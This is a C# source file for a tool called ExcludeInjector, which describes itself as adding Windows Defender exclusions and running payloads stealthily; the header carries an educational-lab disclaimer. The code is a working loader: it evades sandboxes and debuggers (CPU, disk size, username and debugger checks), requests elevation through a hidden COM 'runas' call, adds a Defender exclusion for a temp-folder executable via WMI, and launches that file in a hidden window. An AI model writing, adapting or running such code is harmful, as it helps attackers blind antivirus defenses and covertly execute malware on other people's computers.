............................................................................
. Project: ExcludeInjector                                                 .
. Build for educational purpose in authorized lab environments only.        .
. Purpose: Adds Windows Defender exclusions and executes payloads stealthily.
. Author: Ebere Michhael (Call Simba)                                      .
. Telegram: @lets_sudosu                                                   .
. Make the world a better place.                                           .
............................................................................

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Management;
using System.Text;
using System.Threading;
using System.Diagnostics;

namespace StealthExcl
{
    class Core
    {
        private const string CLSID_ShellApp = "72C24DD5-D70A-438B-8A42-98424B88AFB8";
        private const string IID_IShellDisp = "D8F015C0-C278-11CE-A49E-444553540000";

        [ComImport]
        [Guid(IID_IShellDisp)]
        [InterfaceType(ComInterfaceType.InterfaceIsIDispatch)]
        private interface IShellDispatch
        {
            void ShellExecute(string File,
                              string Arguments,
                              string Directory,
                              string Operation,
                              int    ShowCmd);
        }

        [ComImport]
        [Guid(CLSID_ShellApp)]
        private class ShellApp { }

        private static string XorDecrypt(string input, string key)
        {
            var sb = new StringBuilder();
            for (int i = 0; i < input.Length; i++)
                sb.Append((char)(input[i] ^ key[i % key.Length]));
            return sb.ToString();
        }

        private static void RandomDelay(int min, int max)
        {
            var r = new Random();
            Thread.Sleep(r.Next(min * 1000, max * 1000));
        }

        private static string SanitizeFileName(string name)
        {
            foreach (char c in Path.GetInvalidFileNameChars())
                name = name.Replace(c.ToString(), "_");
            return name;
        }

        private static string SanitizePath(string p)
        {
            foreach (char c in Path.GetInvalidPathChars())
                p = p.Replace(c.ToString(), "_");
            return p;
        }

        private static string GetSafeTempFolder(string log)
        {
            string tmp;
            try
            {
                string raw = Path.GetTempPath();
                File.AppendAllText(
                    log,
                    "[" + DateTime.Now + "] Raw temp path: " + raw + Environment.NewLine);
                tmp = SanitizePath(
                        raw.TrimEnd(
                            Path.DirectorySeparatorChar,
                            Path.AltDirectorySeparatorChar));
                if (!Directory.Exists(tmp))
                    Directory.CreateDirectory(tmp);
            }
            catch (Exception ex)
            {
                File.AppendAllText(
                    log,
                    "[" + DateTime.Now + "] Temp-path error: " + ex.Message + Environment.NewLine);
                tmp = Environment.GetFolderPath(
                          Environment.SpecialFolder.LocalApplicationData);
            }
            return tmp;
        }

        static void Main()
        {
            const string FILE_NAME = "example.exe";
            const string WMI_SCOPE = @"\\.\root\Microsoft\Windows\Defender";
            const string WMI_CLASS = "MSFT_MpPreference";
            string bootstrapLog = Path.Combine(
                    Path.GetTempPath(),
                    "ExclStatus_Startup.log");
            try
            {
                File.AppendAllText(
                    bootstrapLog,
                    "[" + DateTime.Now + "] Injector started" + Environment.NewLine);
            }
            catch { }
            string sessionLog = null;
            try
            {
                string tempFolder = GetSafeTempFolder(bootstrapLog);
                string targetPath = Path.Combine(tempFolder, FILE_NAME);
                sessionLog = Path.Combine(
                                 tempFolder,
                                 SanitizeFileName(
                                     "ExclStatus_" +
                                     Guid.NewGuid()
                                         .ToString("N")
                                         .Substring(0, 8) + ".log"));
                File.AppendAllText(
                    sessionLog,
                    "[" + DateTime.Now + "] Log file ready" + Environment.NewLine);
                File.AppendAllText(
                    sessionLog,
                    "[" + DateTime.Now + "] Checking for " +
                    targetPath + Environment.NewLine);
                if (!File.Exists(targetPath))
                {
                    File.AppendAllText(
                        sessionLog,
                        "[" + DateTime.Now + "] Target payload not found." +
                        Environment.NewLine);
                    return;
                }
                try
                {
                    if (Debugger.IsAttached)
                    {
                        File.AppendAllText(
                            sessionLog,
                            "[" + DateTime.Now + "] Debugger detected." +
                            Environment.NewLine);
                        return;
                    }
                }
                catch (Exception ex)
                {
                    File.AppendAllText(
                        sessionLog,
                        "[" + DateTime.Now + "] Debugger check failed: " + ex.Message +
                        Environment.NewLine);
                }
                try
                {
                    if (Environment.ProcessorCount < 2)
                    {
                        File.AppendAllText(
                            sessionLog,
                            "[" + DateTime.Now + "] Low CPU count (sandbox?)." +
                            Environment.NewLine);
                        return;
                    }
                }
                catch (Exception ex)
                {
                    File.AppendAllText(
                        sessionLog,
                        "[" + DateTime.Now + "] CPU count check failed: " + ex.Message +
                        Environment.NewLine);
                }
                bool diskCheckPassed = true;
                try
                {
                    ManagementObject disk =
                        new ManagementObject("Win32_LogicalDisk.DeviceID='C:'");
                    disk.Get();
                    long size = Convert.ToInt64(disk["Size"]);
                    if (size < 20L * 1024 * 1024 * 1024)
                    {
                        File.AppendAllText(
                            sessionLog,
                            "[" + DateTime.Now + "] Sandbox disk < 20 GB." +
                            Environment.NewLine);
                        return;
                    }
                }
                catch (Exception ex)
                {
                    File.AppendAllText(
                        sessionLog,
                        "[" + DateTime.Now + "] Disk size check failed: " + ex.Message +
                        Environment.NewLine);
                    diskCheckPassed = false;
                }
                if (diskCheckPassed)
                {
                    try
                    {
                        string user = Environment.UserName.ToLower();
                        if (user.Contains("sand") || user.Contains("vm") || user.Contains("test"))
                        {
                            File.AppendAllText(
                                sessionLog,
                                "[" + DateTime.Now + "] Sandbox-like username." +
                                Environment.NewLine);
                            return;
                        }
                    }
                    catch (Exception ex)
                    {
                        File.AppendAllText(
                            sessionLog,
                            "[" + DateTime.Now + "] Username check failed: " + ex.Message +
                            Environment.NewLine);
                    }
                }
                var wp = new System.Security.Principal.WindowsPrincipal(
                             System.Security.Principal.WindowsIdentity.GetCurrent());
                if (!wp.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator))
                {
                    RandomDelay(1, 5);
                    ((IShellDispatch)new ShellApp())
                        .ShellExecute(
                            System.Reflection.Assembly
                                .GetExecutingAssembly()
                                .Location,
                            "",
                            "",
                            "runas",
                            0);
                    File.AppendAllText(
                        sessionLog,
                        "[" + DateTime.Now + "] Elevation requested." +
                        Environment.NewLine);
                    return;
                }
                var scope = new ManagementScope(WMI_SCOPE);
                var pref = new ManagementClass(
                               scope,
                               new ManagementPath(WMI_CLASS),
                               null);
                var inP = pref.GetMethodParameters("Add");
                inP["ExclusionPath"] = new string[] { targetPath };
                uint rv = (uint)pref.InvokeMethod("Add", inP, null)["ReturnValue"];
                File.AppendAllText(
                    sessionLog,
                    "[" + DateTime.Now + "] Add returned: " + rv +
                    Environment.NewLine);
                bool present = false;
                var search =
                    new ManagementObjectSearcher(
                        WMI_SCOPE,
                        "SELECT * FROM " + WMI_CLASS);
                foreach (ManagementObject o in search.Get())
                {
                    string[] paths = o["ExclusionPath"] as string[];
                    if (paths != null)
                    {
                        foreach (string p in paths)
                        {
                            if (string.Equals(p, targetPath, StringComparison.OrdinalIgnoreCase))
                            {
                                present = true;
                                break;
                            }
                        }
                    }
                    if (present) break;
                }
                File.AppendAllText(
                    sessionLog,
                    "[" + DateTime.Now + "] Exclusion " +
                    (present ? "verified" : "missing") +
                    Environment.NewLine);
                if (!present)
                {
                    File.AppendAllText(
                        sessionLog,
                        "[" + DateTime.Now + "] Attempting to reapply exclusion." +
                        Environment.NewLine);
                    rv = (uint)pref.InvokeMethod("Add", inP, null)["ReturnValue"];
                    File.AppendAllText(
                        sessionLog,
                        "[" + DateTime.Now + "] Reapply returned: " + rv +
                        Environment.NewLine);
                    present = false;
                    foreach (ManagementObject o in search.Get())
                    {
                        string[] paths = o["ExclusionPath"] as string[];
                        if (paths != null)
                        {
                            foreach (string p in paths)
                            {
                                if (string.Equals(p, targetPath, StringComparison.OrdinalIgnoreCase))
                                {
                                    present = true;
                                    break;
                                }
                            }
                        }
                        if (present) break;
                    }
                    File.AppendAllText(
                        sessionLog,
                        "[" + DateTime.Now + "] Exclusion after reapply: " +
                        (present ? "verified" : "still missing") +
                        Environment.NewLine);
                }
                File.AppendAllText(
                    sessionLog,
                    "[" + DateTime.Now + "] Reached execution block with present=" + present +
                    Environment.NewLine);
                if (present)
                {
                    File.AppendAllText(
                        sessionLog,
                        "[" + DateTime.Now + "] Attempting to execute " + targetPath +
                        Environment.NewLine);
                    try
                    {
                        ProcessStartInfo psi = new ProcessStartInfo
                        {
                            FileName = targetPath,
                            UseShellExecute = false,
                            CreateNoWindow = true,
                            WindowStyle = ProcessWindowStyle.Hidden
                        };
                        Process process = Process.Start(psi);
                        if (process == null)
                        {
                            File.AppendAllText(
                                sessionLog,
                                "[" + DateTime.Now + "] Execution failed: Process.Start returned null." +
                                Environment.NewLine);
                        }
                        else
                        {
                            File.AppendAllText(
                                sessionLog,
                                "[" + DateTime.Now + "] Execution started with PID: " + process.Id +
                                Environment.NewLine);
                        }
                    }
                    catch (Exception ex)
                    {
                        File.AppendAllText(
                            sessionLog,
                            "[" + DateTime.Now + "] Execution failed: " + ex.Message +
                            Environment.NewLine);
                    }
                }
                else
                {
                    File.AppendAllText(
                        sessionLog,
                        "[" + DateTime.Now + "] Skipping execution due to missing exclusion." +
                        Environment.NewLine);
                }
            }
            catch (Exception ex)
            {
                try
                {
                    string fb = Path.Combine(
                                    Path.GetTempPath(),
                                    "ExclStatus_Error.log");
                    File.AppendAllText(
                        fb,
                        "[" + DateTime.Now + "] ERROR: " + ex.Message + Environment.NewLine);
                    if (sessionLog != null)
                        File.AppendAllText(
                            fb,
                            "Log attempted: " + sessionLog + Environment.NewLine);
                }
                catch 
                {
                    try
                    {
                        File.AppendAllText(
                            @"C:\Windows\Temp\ExclStatus_Error.log",
                            "[" + DateTime.Now + "] ERROR: " + ex.Message + Environment.NewLine);
                    }
                    catch { }
                }
            }
        }
    }
}